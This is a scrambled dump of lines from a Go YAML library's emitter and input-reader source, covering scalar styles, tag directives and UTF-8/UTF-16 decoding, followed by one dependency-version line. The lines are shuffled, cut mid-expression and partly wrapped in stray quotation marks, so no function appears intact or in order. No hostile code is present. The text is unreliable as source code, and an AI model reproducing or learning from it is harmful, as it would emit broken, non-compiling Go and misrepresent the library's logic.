"return yaml_emitter_emit_document_start(emitter, event, false)"
"return yaml_emitter_emit_flow_mapping_key(emitter, event, false)"
"if !yaml_emitter_write_indicator(emitter, []byte(""%YAML""), true, false, false) {"
emitter.scalar_data.block_allowed = false
switch value[i] {
xBB'
if flow {
// Expect a block value node.
case yaml_CRLN_BREAK:
tag_copy := yaml_tag_directive_t{
0xC0 == 0x80 {
w = width(value[i])
if len(emitter.events)-emitter.events_head < 2 {
5 >= len(emitter.buffer) {
var (
accumulate = 1
 emitter.column > emitter.best_width {
func yaml_emitter_check_empty_document(emitter 
') {
if len(event.anchor) > 0 {
" is_break(value, i) "
 !event.quoted_implicit {
= width(value[k])
package yaml
 i < len(default_tag_directives)
"return yaml_emitter_emit_flow_sequence_item(emitter, event, true)"
"yaml_emitter_t, value []byte, need_whitespace bool) bool {"
0x7F)
"ok = put(emitter, '""')"
func write_all(emitter 
v = (v << 6) 
if digit < 10 {
func yaml_emitter_emit_flow_sequence_item(emitter 
p := emitter.buffer_pos
if i
"return yaml_emitter_set_emitter_error(emitter, ""expected DOCUMENT-START or STREAM-END"")"
func yaml_emitter_set_emitter_error(emitter 
case ':':
if version_directive.major != 1 
case yaml_DOCUMENT_START_EVENT:
func yaml_emitter_emit_sequence_start(emitter 
emitter.flow_level--
func yaml_emitter_emit_mapping_start(emitter 
"return yaml_emitter_write_literal_scalar(emitter, emitter.scalar_data.value)"
'' {
"emitter.tag_directives = append(emitter.tag_directives, tag_copy)"
line_breaks = true
 i < len(handle)-1
// Append a directive to the directives stack.
 style == yaml_FOLDED_SCALAR_STYLE {
implicit = false
func yaml_emitter_emit_block_sequence_item(emitter 
if simple {
leading_space = true
emitter.problem = problem
"if !yaml_emitter_append_tag_directive(emitter, tag_directive, true) {"
if need_whitespace 
emitter.buffer[emitter.buffer_pos] = value
// and the lack of deallocating destructors
"handle: make([]byte, len(value.handle)),"
trailing_break = false
case 0x2028:
"'', '""', '%', '@', '"
} else if v <= 0xFFFF {
 is_indention)
if len(handle) == 0 {
"return yaml_emitter_set_emitter_error(emitter, ""tag handle must start with '!'"")"
 i < len(value)-1 
// Expect DOCUMENT-END.
 Couldn't be the end of the string as that's the loop condition.
func yaml_emitter_emit_scalar(emitter 
// State dispatcher.
"yaml_emitter_t, value []byte) bool {"
 (emitter.canonical 
 i < len(event.tag_directives)
if !yaml_emitter_write_indent(emitter) {
if len(emitter.tag_data.handle) > 0 {
flow_indicators    = false
 value[i] == '
emitter.scalar_data.block_allowed = true
if allow_duplicates {
emitter.scalar_data.single_quoted_allowed = false
 0x0F)
// [Go] Allocate these slices elsewhere.
yaml_event_t) bool {
indent := emitter.indent
func yaml_emitter_process_tag(emitter 
emitter.buffer[emitter.buffer_pos
"if !yaml_emitter_analyze_tag_directive(emitter, tag_directive) {"
 value[2] == '-') 
case yaml_SINGLE_QUOTED_SCALAR_STYLE:
"if !yaml_emitter_write_indicator(emitter, []byte{'{'}, true, true, false) {"
 !event.quoted_implicit 
c = octet 
 i < len(value)
if first {
0] = '
return length <= 128
return yaml_emitter_flush(emitter)
 emitter.simple_key_context {
"if !yaml_emitter_write_indicator(emitter, []byte(""---""), true, false, false) {"
"return yaml_emitter_emit_sequence_start(emitter, event)"
tag_directive := 
// Write the BOM character.
"ok = put(emitter, '"
if !implicit {
octet := value[i]
if previous_break {
"if !put(emitter, '"
"if !yaml_emitter_select_scalar_style(emitter, event) {"
"if !is_alpha(anchor, i) {"
// Copy a line break character from a string into buffer.
"return yaml_emitter_emit_document_start(emitter, event, true)"
"panic(""unknown character width"")"
"""fmt"""
followed_by_whitespace = false
1] = '
case 0x08:
accumulate = 3
emitter.tag_directives = emitter.tag_directives[:0]
"copy(tag_copy.handle, value.handle)"
if len(prefix) == 0 {
"ok = put(emitter, 'N')"
if emitter.scalar_data.multiline {
emitter.scalar_data.single_quoted_allowed = true
= w {
emitter.line_break = yaml_LN_BREAK
emitter.scalar_data.value = nil
for k := 0
case yaml_EMIT_FLOW_MAPPING_VALUE_STATE:
"for is_break(value, k) {"
"if bytes.HasPrefix(tag, tag_directive.prefix) {"
"if is_break(value, i) {"
// Put a character to the output buffer.
// Write a scalar.
case yaml_EMIT_DOCUMENT_END_STATE:
"return yaml_emitter_set_emitter_error(emitter, ""duplicate %TAG directive"")"
pos := emitter.buffer_pos
previous_space = false
emitter.buffer_pos
handle := tag_directive.handle
func yaml_emitter_emit_node(emitter 
func yaml_emitter_analyze_scalar(emitter 
"yaml_emitter_t, problem string) bool {"
 !event.implicit {
func flush(emitter 
"yaml_emitter_t, anchor []byte, alias bool) bool {"
len(emitter.tag_data.suffix) 
i) {
yaml_event_delete(event)
"if !yaml_emitter_write_tag_handle(emitter, tag_directive.handle) {"
emitter.mapping_context = mapping
if alias {
breaks = false
 !spaces 
// We accumulate extra
1] = s[
 !first {
if !yaml_emitter_check_empty_sequence(emitter) {
emitter.scalar_data.block_plain_allowed = true
func yaml_emitter_write_bom(emitter 
"if is_space(value, i) {"
emitter.open_ended = true
if len(event.tag_directives) > 0 {
func write_break(emitter 
breaks := true
yaml_emitter_t) bool {
case 0x2029:
case yaml_EMIT_FLOW_MAPPING_SIMPLE_VALUE_STATE:
if indent < 0 {
for i := 1
if !yaml_emitter_write_bom(emitter) {
// Check if the next events represent an empty mapping.
// Check if a %YAML directive is valid.
 trailing_break {
if event.typ == yaml_DOCUMENT_START_EVENT {
"if !is_blankz(value, k) {"
"if !yaml_emitter_analyze_event(emitter, event) {"
"return yaml_emitter_emit_block_mapping_value(emitter, event, false)"
func yaml_emitter_analyze_tag(emitter 
"ok = put(emitter, 'L')"
return emitter.events[emitter.events_head].typ == yaml_MAPPING_START_EVENT 
if space_break 
"return yaml_emitter_set_emitter_error(emitter, ""tag handle must not be empty"")"
if followed_by_whitespace {
 emitter.column > emitter.best_width 
"return yaml_emitter_emit_alias(emitter, event)"
func yaml_emitter_write_folded_scalar(emitter 
func yaml_emitter_process_anchor(emitter 
 !event.implicit) {
 (emitter.flow_level > 0 
case 2:
breaks := false
len(emitter.scalar_data.value)
func yaml_emitter_check_empty_mapping(emitter 
case yaml_EMIT_DOCUMENT_CONTENT_STATE:
if !emitter.canonical 
// Check if an anchor is valid.
func yaml_emitter_analyze_event(emitter 
case yaml_EMIT_FIRST_DOCUMENT_START_STATE:
"', '[', ']', '{', '}':"
func yaml_emitter_write_tag_handle(emitter 
"if !write(emitter, s, "
"return yaml_emitter_set_emitter_error(emitter, ""tag handle must end with '!'"")"
"yaml_emitter_t, value byte) bool {"
 !emitter.unicode {
case 0x00:
if emitter.indent < 0 {
"emitter.indents = append(emitter.indents, emitter.indent)"
switch w {
return false // [Go] Huh
// Expect a flow item node.
case 0x0b:
for emitter.column < indent {
accumulate = 2
"return yaml_emitter_write_anchor(emitter, emitter.anchor_data.anchor)"
 emitter.column > indent 
trailing_space = true
previous_space = true
emitter.indents = emitter.indents[:len(emitter.indents)-1]
 emitter.best_width <= emitter.best_indent
 !emitter.whitespace) {
 !emitter.whitespace {
2] = s[
"yaml_emitter_t, s []byte, i "
// Expect STREAM-START.
if !first 
 (value[0] == '.' 
"return yaml_emitter_set_emitter_error(emitter, ""incompatible %YAML directive"")"
"if !yaml_emitter_write_indicator(emitter, []byte{','}, false, false, false) {"
0x0F)
func yaml_emitter_write_plain_scalar(emitter 
if !breaks 
"', ':':"
"return yaml_emitter_emit_flow_sequence_item(emitter, event, false)"
case yaml_ALIAS_EVENT:
emitter.events[emitter.events_head
"''}, false, false, false) {"
"yaml_emitter_t, s []byte) bool {"
leading_break = true
for k := (w - 1) 
"if !yaml_emitter_write_indicator(emitter, []byte{'""'}, true, false, false) {"
case '-':
// Expect MAPPING-START.
// Check if a tag is valid.
// Copy a character from a string into buffer.
// Check if the document content is an empty scalar.
// Check if a scalar is valid.
indent_hint := []byte{'0' 
"if !yaml_emitter_write_indicator(emitter, []byte{':'}, false, false, false) {"
if event.typ == yaml_STREAM_END_EVENT {
emitter.best_indent = 2
k := 0
if !ok {
if style == yaml_ANY_SCALAR_STYLE {
style = yaml_DOUBLE_QUOTED_SCALAR_STYLE
" is_break(value, 0) {"
emitter.anchor_data.alias = alias
0x80 == 0x00:
if s[
// Expect the root node.
// Expect ALIAS.
emitter.whitespace = false
prefix := tag_directive.prefix
func yaml_emitter_write_literal_scalar(emitter 
"if !yaml_emitter_write_indicator(emitter, []byte{'-'}, true, false, true) {"
"ok = put(emitter, 'b')"
if event.typ == yaml_MAPPING_END_EVENT {
if style == yaml_LITERAL_SCALAR_STYLE 
= width(value[i])
w := width(s[
 !leading_spaces 
"if !yaml_emitter_write_tag_content(emitter, emitter.tag_data.suffix, false) {"
// Determine an acceptable scalar style.
func yaml_emitter_write_tag_content(emitter 
emitter.sequence_context = sequence
= width(handle[i]) {
previous_break = true
= '0'
n' {
"w, v = 2, rune(octet"
space_break = true
"ok = put(emitter, '0')"
func yaml_emitter_select_scalar_style(emitter 
special_characters = false
case yaml_MAPPING_START_EVENT:
"return yaml_emitter_emit_block_mapping_key(emitter, event, true)"
"problem := ""anchor value must contain alphanumerical characters only"""
"yaml_emitter_t, value "
"', '$', ',', '_', '.', '"
0xF0 == 0xE0:
 k >= 0
event := 
yaml_tag_directive_t) bool {
must_write = true
"return yaml_emitter_set_emitter_error(emitter, ""tag handle must contain alphanumerical characters only"")"
"emitter.states = append(emitter.states, yaml_EMIT_FLOW_MAPPING_VALUE_STATE)"
emitter.scalar_data.flow_plain_allowed = false
"if !write_break(emitter, value, "
case 0x5c:
var accumulate int
if emitter.events_head == len(emitter.events) {
"return yaml_emitter_emit_block_mapping_value(emitter, event, true)"
emitter.state = yaml_EMIT_BLOCK_MAPPING_FIRST_KEY_STATE
emitter.state = yaml_EMIT_BLOCK_SEQUENCE_FIRST_ITEM_STATE
space_break    = false
"emitter.states = append(emitter.states, yaml_EMIT_BLOCK_MAPPING_VALUE_STATE)"
if no_tag 
"if !yaml_emitter_analyze_anchor(emitter, event.anchor, true) {"
if flow_indicators {
case yaml_CR_BREAK:
 0x0f
case 0x0d:
func yaml_emitter_analyze_anchor(emitter 
digit := byte((v >> uint(k)) 
"for i, w := 0, 0"
if must_write {
"if !yaml_emitter_write_indicator(emitter, []byte{'}'}, false, false, false) {"
switch emitter.state {
func yaml_emitter_write_indicator(emitter 
special_characters = true
emitter.whitespace = true
if break_space {
spaces := false
 special_characters {
"return yaml_emitter_set_emitter_error(emitter, problem)"
"if !put(emitter, ' ') {"
"emitter.events = append(emitter.events, "
preceded_by_whitespace = false
if c < 10 {
if level == 0 {
"ok = put(emitter, 't')"
"return yaml_emitter_emit_block_sequence_item(emitter, event, true)"
if emitter.buffer_pos
emitter.state = yaml_EMIT_END_STATE
var chomp_hint [1]byte
 len(event.tag_directives) > 0) {
case 3:
"return yaml_emitter_emit_mapping_start(emitter, event)"
for k := 1
 ((value[0] == '-' 
switch emitter.scalar_data.style {
 emitter.canonical {
emitter.state = yaml_EMIT_DOCUMENT_CONTENT_STATE
emitter.indent = 0
case yaml_EMIT_BLOCK_SEQUENCE_ITEM_STATE:
w = 4
"if !yaml_emitter_state_machine(emitter, event) {"
"is_bom(value, i) "
func yaml_emitter_write_double_quoted_scalar(emitter 
func yaml_emitter_emit_block_mapping_key(emitter 
if yaml_emitter_check_empty_document(emitter) {
if emitter.canonical 
"problem = ""alias value must not be empty"""
 version_directive.minor != 1 {
0x07)
previous_break = false
// Check if the next events represent an empty sequence.
0xF8 == 0xF0:
"', '!', '"
emitter.indent = -1
// Write an anchor.
"return yaml_emitter_write_single_quoted_scalar(emitter, emitter.scalar_data.value, !emitter.simple_key_context)"
width(value[i]) == len(value) {
case 0x85:
"emitter.states = append(emitter.states, yaml_EMIT_FLOW_MAPPING_SIMPLE_VALUE_STATE)"
"if !write(emitter, s, i) {"
i] == '
"yaml_event_t,"
"return yaml_emitter_emit_block_mapping_key(emitter, event, false)"
len(emitter.tag_data.suffix)
previous_space         = false
 value[1] == '-' 
"return yaml_emitter_set_emitter_error(emitter, ""expected STREAM-START"")"
//  - 1 event for DOCUMENT-START
"if !yaml_emitter_analyze_scalar(emitter, event.value) {"
case yaml_EMIT_FLOW_MAPPING_KEY_STATE:
if v <= 0xFF {
"panic(""invalid emitter state"")"
"preceded_by_whitespace = is_blankz(value, i)"
switch {
if len(event.tag) > 0 
breaks = true
if previous_space {
emitter.scalar_data.style = style
 event.sequence_style() == yaml_FLOW_SEQUENCE_STYLE 
break_space    = false
5 >= len(emitter.buffer) 
" !is_ascii(value, i)) "
event)
if emitter.best_width < 0 {
case yaml_LITERAL_SCALAR_STYLE:
 !event.implicit 
followed_by_whitespace = i
} else if i == 0 {
if event.version_directive != nil {
emitter.indent 
 yaml_emitter_check_simple_key(emitter) {
"root bool, sequence bool, mapping bool, simple_key bool) bool {"
var ok bool
"return yaml_emitter_set_emitter_error(emitter, ""expected DOCUMENT-END"")"
"return yaml_emitter_emit_document_end(emitter, event)"
if emitter.encoding == yaml_ANY_ENCODING {
"return yaml_emitter_set_emitter_error(emitter,"
= width(anchor[i]) {
"', '>', '"
0x1F)
"if !yaml_emitter_write_indicator(emitter, []byte{':'}, true, false, false) {"
"yaml_emitter_t, version_directive "
emitter.tag_directives[i]
indent = 0
"if !yaml_emitter_analyze_version_directive(emitter, event.version_directive) {"
c := octet >> 4
case octet
= 'A' - 10
level--
case 0x09:
"ok = put(emitter, 'U')"
case yaml_SCALAR_EVENT:
emitter.encoding = yaml_UTF8_ENCODING
"ok = put(emitter, 'a')"
"if !yaml_emitter_write_indicator(emitter, []byte{'['}, true, true, false) {"
if emitter.open_ended {
func yaml_emitter_emit_flow_mapping_value(emitter 
"if !yaml_emitter_write_indicator(emitter, []byte(""1.1""), true, false, false) {"
// Check if we need to accumulate more events before emitting.
 0x3F)
case yaml_EMIT_BLOCK_MAPPING_VALUE_STATE:
// Expect SCALAR.
if emitter.anchor_data.anchor == nil {
emitter.tag_data.suffix = nil
if emitter.best_width >= 0 
func yaml_emitter_check_empty_sequence(emitter 
if event.typ != yaml_DOCUMENT_END_EVENT {
"case yaml_STREAM_END_EVENT, yaml_DOCUMENT_END_EVENT, yaml_SEQUENCE_END_EVENT, yaml_MAPPING_END_EVENT:"
emitter.anchor_data.anchor = anchor
if style == yaml_SINGLE_QUOTED_SCALAR_STYLE {
line_breaks        = false
"problem := ""anchor value must not be empty"""
"if !put(emitter, '%') {"
emitter.indent = emitter.best_indent
if value[i] == '
if leading_space 
"return yaml_emitter_write_plain_scalar(emitter, emitter.scalar_data.value, !emitter.simple_key_context)"
2] = '
trailing_break = true
case yaml_EMIT_END_STATE:
func yaml_emitter_analyze_tag_directive(emitter 
'') {
'A'-10)
 leading_break 
emitter.scalar_data.value = value
'0')
yaml_emitter_check_empty_mapping(emitter) {
= len(emitter.anchor_data.anchor)
if !yaml_emitter_flush(emitter) {
case 0x0A:
return emitter.events[emitter.events_head].typ == yaml_SEQUENCE_START_EVENT 
if emitter.line_break == yaml_ANY_BREAK {
chomp_hint[0] = '-'
"yaml_emitter_t, tag_directive "
// [Go] Allocate the slice elsewhere.
"""bytes"""
func yaml_emitter_write_single_quoted_scalar(emitter 
emitter.scalar_data.block_plain_allowed = false
xEF'
emitter.tag_data.handle = tag_directive.handle
"if !yaml_emitter_write_indicator(emitter, []byte(""...""), true, false, false) {"
func yaml_emitter_emit_document_end(emitter 
style := event.scalar_style()
emitter.flow_level == 0 
" !is_ascii(value, i) "
case 1:
"panic(""unknown line break setting"")"
w >= len(value) 
if !yaml_emitter_process_anchor(emitter) {
 ok 
"if !yaml_emitter_write_block_scalar_hints(emitter, value) {"
switch emitter.events[i].typ {
 k < w
"return yaml_emitter_emit_node(emitter, event, false, false, true, false)"
// Expect SEQUENCE-START.
func yaml_emitter_emit_alias(emitter 
"prefix: make([]byte, len(value.prefix)),"
case 0xA0:
"if !yaml_emitter_append_tag_directive(emitter, tag_directive, false) {"
 !emitter.indention) {
// Expect a block key node.
"ok = put(emitter, 'x')"
 emitter.canonical 
if emitter.canonical {
"leading_spaces = is_blank(value, i)"
func yaml_emitter_emit_block_mapping_value(emitter 
"', ',', '[', ']', '{', '}', '"
switch event.typ {
"if !yaml_emitter_write_tag_handle(emitter, emitter.tag_data.handle) {"
for !yaml_emitter_need_more_events(emitter) {
if emitter.anchor_data.alias {
if event.typ == yaml_SEQUENCE_END_EVENT {
// Check if a %TAG directive is valid.
//  - 2 events for SEQUENCE-START
case yaml_EMIT_BLOCK_MAPPING_FIRST_KEY_STATE:
"if !is_alpha(handle, i) {"
"if !put(emitter, c) {"
"if !is_printable(value, i) "
"} else if !write(emitter, value, "
// Write a tag.
" is_blank(value, i"
"return yaml_emitter_emit_node(emitter, event, true, false, false, false)"
func yaml_emitter_append_tag_directive(emitter 
0] = s[
emitter.events[emitter.events_head]
 (rune(octet) 
"if !is_break(value, i) {"
emitter.state = yaml_EMIT_FLOW_SEQUENCE_FIRST_ITEM_STATE
"ok = put(emitter, '_')"
// Expect a flow value node.
"ok = put(emitter, digit"
"if !yaml_emitter_write_indicator(emitter, []byte(""%TAG""), true, false, false) {"
switch emitter.events[emitter.events_head].typ {
leading_break  = false
event.tag_directives[i]
// Check if the event data is valid.
= len(emitter.anchor_data.anchor) 
"value[i] == '""' "
 !yaml_emitter_flush(emitter) {
} else if !indentless {
// [Go] Do we actually need to copy this given garbage collection
import (
var level int
// [Go]: Why 'z'
// Increase the indentation level.
emitter.state = yaml_EMIT_FIRST_DOCUMENT_START_STATE
"return yaml_emitter_write_folded_scalar(emitter, emitter.scalar_data.value)"
level
func yaml_emitter_check_simple_key(emitter 
func yaml_emitter_emit_document_content(emitter 
case yaml_EMIT_DOCUMENT_START_STATE:
if handle[0] != '!' {
case 0x1b:
1].typ == yaml_SEQUENCE_END_EVENT
block_indicators   = false
 (emitter.column == indent 
func yaml_emitter_state_machine(emitter 
 (event.version_directive != nil 
emitter.open_ended = false
emitter.best_width = 80
for i := 0
switch v {
 byte(emitter.best_indent)}
emitter.buffer_pos 
emitter.state = yaml_EMIT_DOCUMENT_START_STATE
"if !yaml_emitter_write_indicator(emitter, chomp_hint[:], false, false, false) {"
block_indicators = true
"if !yaml_emitter_write_indicator(emitter, indent_hint, false, false, false) {"
"', ':', '@', '"
3] = s[
if !put_break(emitter) {
emitter.anchor_data.anchor = nil
emitter.state = emitter.states[len(emitter.states)-1]
"if is_space(value, 0) "
"', '"
if breaks {
 emitter.best_indent > 9 {
"if is_space(value, i"
if emitter.flow_level > 0 
"return yaml_emitter_emit_document_content(emitter, event)"
if !emitter.scalar_data.single_quoted_allowed {
 i < len(value)-1 {
preceded_by_whitespace = true
emitter.whitespace = is_whitespace
"yaml_tag_directive_t, allow_duplicates bool) bool {"
c := []byte{'
"ok = put(emitter, 'P')"
 i > 0 
if event.typ != yaml_STREAM_START_EVENT {
if !yaml_emitter_process_tag(emitter) {
emitter.buffer[p
"emitter.states = append(emitter.states, yaml_EMIT_BLOCK_MAPPING_KEY_STATE)"
// Flush the buffer if needed.
"return yaml_emitter_set_emitter_error(emitter, ""tag prefix must not be empty"")"
case yaml_EMIT_FLOW_MAPPING_FIRST_KEY_STATE:
flow_indicators = true
"yaml_emitter_t, indicator []byte, need_whitespace, is_whitespace, is_indention bool) bool {"
emitter.tag_data.suffix = tag[len(tag_directive.prefix):]
"'', '(', ')', '[', ']':"
"if !yaml_emitter_write_indicator(emitter, []byte{'""'}, false, false, false) {"
"ok = put(emitter, 'v')"
// Check if the next node can be expressed as a simple key.
if !emitter.scalar_data.block_allowed 
 len(emitter.tag_data.suffix) == 0 {
 i < len(emitter.tag_directives)
emitter.simple_key_context = simple_key
if emitter.root_context {
emitter.tag_data.handle = nil
if !emitter.indention 
"return yaml_emitter_set_emitter_error(emitter, ""tag value must not be empty"")"
if !emitter.whitespace {
"w, v = 3, rune(octet"
"problem = ""alias value must contain alphanumerical characters only"""
case yaml_EMIT_FLOW_SEQUENCE_FIRST_ITEM_STATE:
func yaml_emitter_write_block_scalar_hints(emitter 
if !first {
yaml_version_directive_t) bool {
" is_space(value, i) "
emitter.tag_data.handle = []byte{'!'}
// Expect a node.
 !emitter.scalar_data.flow_plain_allowed 
"if !yaml_emitter_write_indicator(emitter, []byte{'>'}, false, false, false) {"
func yaml_emitter_analyze_version_directive(emitter 
int) bool {
"emitter.states = append(emitter.states, yaml_EMIT_BLOCK_SEQUENCE_ITEM_STATE)"
 (value2 
} else if err != nil {
"k, int(octet))"
 (value 
 0x07)
"""expected low surrogate area"","
default:
"yaml_parser_t, problem string, offset int, value int) bool {"
value = rune(octet 
case value >= 0x20 
// The UTF-16 encoding is not as simple as one might
0xFC00 != 0xDC00 {
"yaml_parser_t, length int) bool {"
"return yaml_parser_set_reader_error(parser,"
// are prohibited as they are reserved for use with UTF-16
"// On EOF, put NUL into the buffer and return."
0xE0 == 0xC0:
// This happens here due to the EOF above breaking early.
0] = byte(value)
length
0xFC00 == 0xD800 {
// Check for a low surrogate area.
 parser.raw_buffer_pos == len(parser.raw_buffer) {
if value2
0] = byte(0xE0 
value = rune(parser.raw_buffer[parser.raw_buffer_pos
parser.problem_value = value
 k < width
if !yaml_parser_update_raw_buffer(parser) {
break inner
"// If the EOF flag is set and the raw buffer is empty, do nothing."
// Generate the value of the surrogate pair.
xE000-
// (http://www.ietf.org/rfc/rfc2781.txt).
width = 2
"bom_UTF8    = """
              (binary)
buf := parser.raw_buffer
//   --------------------
 buf[pos] == bom_UTF8[0] 
if parser.buffer_pos > 0 
for parser.raw_buffer_pos != len(parser.raw_buffer) {
 0x10000   (0x01 00 00 <= U <= 0x10 FF FF)
// surrogate pair) is used for specifying character
1] == bom_UTF8[1] 
} else {
"// Additionally, the characters in the range 0xD800-0xDFFF"
 value <= 0xFFFD:
break
return true
parser.raw_buffer_pos = 0
if parser.eof {
3] = byte(0x80 
 (value >> 12))
// The leading octet is invalid.
 value <= 0xDFFF 
        UTF-8 octet sequence
// Check if the octet is valid.
parser.buffer[buffer_len] = 0
 buf[pos] == bom_UTF16LE[0] 
case value >= 0x10000 
"""invalid length of a UTF-8 sequence"","
"// The fact we need to do this is pretty awful, but the description above implies"
= width
//      high surrogate area (0xD800-0xDBFF)
"panic(""read handler must be set"")"
//  U  = U' 
case value == 0x09:
buffer_len -= parser.buffer_pos
buffer_len := len(parser.buffer)
// values larger than 0xFFFF.
for buffer_len < length {
raw_unread := len(parser.raw_buffer) - parser.raw_buffer_pos
// Decode the next character.
func yaml_parser_update_buffer(parser 
// Determine the length of the UTF-8 sequence.
avail := len(buf) - pos
// Check if the character is in the allowed range:
"var low, high int"
return false
high
0x3F)
"""io"""
// 0001 0000-0010 FFFF . 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
"parser.offset, int(value))"
parser.problem_offset = offset
2]) 
 0xC0) != 0x80 {
"copy(parser.buffer, parser.buffer[parser.buffer_pos:])"
// Move the remaining bytes in the raw buffer to the beginning.
// 0000 0080-0000 07FF . 110xxxxx 10xxxxxx
case width == 3 
// Ensure that the buffer contains at least 
 len(parser.raw_buffer)-parser.raw_buffer_pos < 3 {
package yaml
// Check if the raw buffer contains an incomplete character.
// Update the raw buffer.
"""control characters are not allowed"","
"xff"""
"2, int(value2))"
xA0-
// given length in the buffer. Not doing that means every single
case value >= 0xE000 
func yaml_parser_determine_encoding(parser 
// every single check that calls this function to make sure the buffer
// Fill the raw buffer if necessary.
parser.encoding = yaml_UTF16BE_ENCODING
if parser.unread >= length {
// Decode the raw buffer.
if parser.eof 
"// Open the whole buffer for writing, and cut it before returning."
// Determine the encoding.
if parser.raw_buffer_pos > 0 
// Determine the input encoding if it is not known yet.
// The following formulas are used for decoding
first = false
"low, high = 1, 0"
 1110xxxx 10xxxxxx 10xxxxxx
func yaml_parser_update_raw_buffer(parser 
0xFC00 == 0xDC00 {
"panic(""impossible"")"
 0x0F)
2]) << 8)
 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
// Finally put the character into the buffer.
case width == 4 
buffer_len
// character.  However a special technique (called a
if (octet 
if parser.encoding == yaml_UTF16LE_ENCODING {
 rune(octet
// 0000 0800-0000 FFFF . 1110xxxx 10xxxxxx 10xxxxxx
// Fill the buffer until it has enough characters.
parser.eof = true
parser.error = yaml_READER_ERROR
 parser.raw_buffer_pos < len(parser.raw_buffer) {
 ((value 
 0x3FF) << 10) 
x10000-
low]) 
parser.raw_buffer_pos 
"parser.offset, -1)"
------------------------------------
parser.unread
var value rune
// Check for incomplete surrogate pair.
value = (value << 6) 
"// found, the UTF-8 encoding is assumed. Return 1 on success, 0 on failure."
"size_read, err := parser.read_handler(parser, parser.raw_buffer[len(parser.raw_buffer):cap(parser.raw_buffer)])"
// decoding.
"err.Error(), parser.offset, -1)"
case value == 0x0A:
if parser.read_handler == nil {
case width == 1:
} else if parser.buffer_pos == buffer_len {
1] == bom_UTF16BE[1] {
// [Go] This function was changed to guarantee the requested length size at EOF.
"// This is just broken. To return true, we need to have the"
"""invalid trailing UTF-8 octet"","
"bom_UTF16BE = """
// Check the length of the sequence against the value.
"""incomplete UTF-16 surrogate pair"","
high]) << 8)
"return yaml_parser_set_reader_error(parser, ""input error: """
//   0000 0800-0000 FFFF 
"""unexpected low surrogate area"","
if value
 parser.buffer_pos < buffer_len {
x85 
 len(parser.raw_buffer) == cap(parser.raw_buffer) {
// Return on EOF.
// Decode the octet.
if value >= 0xD800 
} else if avail >= 2 
parser.buffer = parser.buffer[:cap(parser.buffer)]
"case yaml_UTF16LE_ENCODING, yaml_UTF16BE_ENCODING:"
// Check and decode the trailing octets.
"// [Go] Read the documentation of this function above. To return true,"
const (
 0x7F)
if !first 
 0xxxxxxx
func yaml_parser_set_reader_error(parser 
} else if value <= 0x7FF {
"xbf"""
size_read := 0
// given length is Go) panicking
//  W2 = 110111xxxxxxxxxx
case value == 0x85:
if value <= 0x7F {
 value >= 0x800:
0x80 == 0x00:
"// for that to be the case, and there are tests "
x10FFFF]                        (32 bit)
buffer_len 
//   0000 0080-0000 07FF 
"""invalid Unicode character"","
 value <= 0x7E:
// A surrogate pair consists of two pseudo-characters:
// Move the raw pointers.
switch parser.encoding {
0xF0 == 0xE0:
// [Go] ACTUALLY! Read the documentation of this function above.
for parser.unread < length {
// Move the unread characters to the beginning of the buffer.
 value >= 0x80:
if err == io.EOF {
0] = byte(0xC0 
parser.encoding = yaml_UTF8_ENCODING
// Return if the raw buffer is full.
// The length is supposed to be significantly less that the buffer size.
"// Normally, two subsequent bytes describe a Unicode"
0] = byte(0xF0 
case width == 2 
 characters.
 ((value >> 6) 
 110xxxxx 10xxxxxx
//   0001 0000-0010 FFFF 
// Ensure that we had enough bytes in the raw buffer.
"""invalid leading UTF-8 octet"","
"// Return true on success, false on failure."
for k := 1
case value >= 0xA0 
 buf[pos] == bom_UTF16BE[0] 
//   0000 0000-0000 007F 
xD7FF] 
parser.buffer = parser.buffer[:buffer_len]
1] == bom_UTF16LE[1] {
//    Char. number range 
0xF8 == 0xF0:
"xfe"""
octet = parser.raw_buffer[parser.raw_buffer_pos
size_read]
if raw_unread < 4 {
// Byte order marks.
2] = byte(0x80 
 value >= 0x10000:
parser.buffer[buffer_len
switch {
// and encoding characters using surrogate pairs:
"parser.offset, int(octet))"
pos := parser.raw_buffer_pos
if !yaml_parser_determine_encoding(parser) {
"""incomplete UTF-8 octet sequence"","
x7E]               (8 bit)
//      (hexadecimal)    
width = 4
"low, high = 0, 1"
 or C) accessing invalid memory.
// Call the read handler to fill the buffer.
case octet
value2 := rune(parser.raw_buffer[parser.raw_buffer_pos
"// area, W2 is the low surrogate area."
for !parser.eof 
"copy(parser.raw_buffer, parser.raw_buffer[parser.raw_buffer_pos:])"
if parser.encoding == yaml_ANY_ENCODING {
parser.offset
 ((value >> 12) 
 (value >> 6))
 0x1F)
parser.offset 
 0x3F))
if avail >= 2 
// Set the reader error and return 0.
x20-
parser.buffer_pos = 0
 (value >> 18))
//  W1 = 110110yyyyyyyyyy
// Return if the buffer contains enough characters.
// Get the character.
// Get the next character.
 0x3FF)
value = 0
var width int
//      
// naively think.  Check RFC 2781
inner:
case value == 0x0D:
//      low surrogate area (0xDC00-0xDFFF)
if raw_unread < 2 {
// Decode the leading octet.
 value <= 0x10FFFF:
 value <= 0xD7FF:
width = 3
} else if value <= 0xFFFF {
// 0000 0000-0000 007F . 0xxxxxxx
// check that calls this function to make sure the buffer has a
 value > 0x10FFFF {
// Check for incomplete UTF-16 character.
yaml_parser_t) bool {
// has a given length is Go) panicking
parser.raw_buffer = parser.raw_buffer[:len(parser.raw_buffer)
// Determine the input stream encoding by checking the BOM symbol. If no BOM is
"// where U is the character value, W1 is the high surrogate"
(rune(parser.raw_buffer[parser.raw_buffer_pos
"bom_UTF16LE = """
import (
// The following table (taken from the RFC) is used for
parser.encoding = yaml_UTF16LE_ENCODING
parser.raw_buffer = parser.raw_buffer[:len(parser.raw_buffer)-parser.raw_buffer_pos]
if width > raw_unread {
// (http://www.ietf.org/rfc/rfc3629.txt) for more details.
xFFFD]    (16 bit)
width = 1
first := true
// surrogate pairs.
} else if avail >= 3 
// Check the range of the value.
value = 0x10000 
// Decode a UTF-8 character.  Check RFC 3629
// we need to have the given length in the buffer. Not doing that means
//return true
if parser.raw_buffer_pos == 0 
2] == bom_UTF8[2] {
//  U' = yyyyyyyyyyxxxxxxxxxx   (0 <= U' <= 0x0F FF FF)
// Check for unexpected low surrogate area.
buffer_len = 0
 buf[pos
case yaml_UTF8_ENCODING:
1] = byte(0x80 
"""incomplete UTF-16 character"","
parser.problem = problem
octet := parser.raw_buffer[parser.raw_buffer_pos]
// Check for a high surrogate area.
"""gopkg.in/check.v1"" v0.0.0-20161208181325-20d25e280405"
